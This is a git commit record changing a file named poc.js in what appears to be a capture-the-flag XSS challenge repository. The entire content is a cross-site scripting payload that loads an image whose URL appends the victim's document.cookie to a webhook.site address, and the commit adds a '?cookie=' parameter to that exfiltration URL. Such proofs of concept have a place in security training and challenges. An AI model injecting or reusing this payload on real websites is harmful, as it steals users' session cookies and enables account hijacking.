e07ccf461d7320628bd63a71ed69c4bd4424bd8e
Javier Morin <54748637+jmorin8@users.noreply.github.com>
2024-03-25 18:43:03 -0600

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,3 +1,3 @@
 # xss-poc-web-chall
 var x = new Image;
-x.src = "https://webhook.site/223a9f41-fd3a-42b2-b715-29b1c47162b5" + document.cookie;
+x.src = "https://webhook.site/223a9f41-fd3a-42b2-b715-29b1c47162b5/?cookie=" + document.cookie;
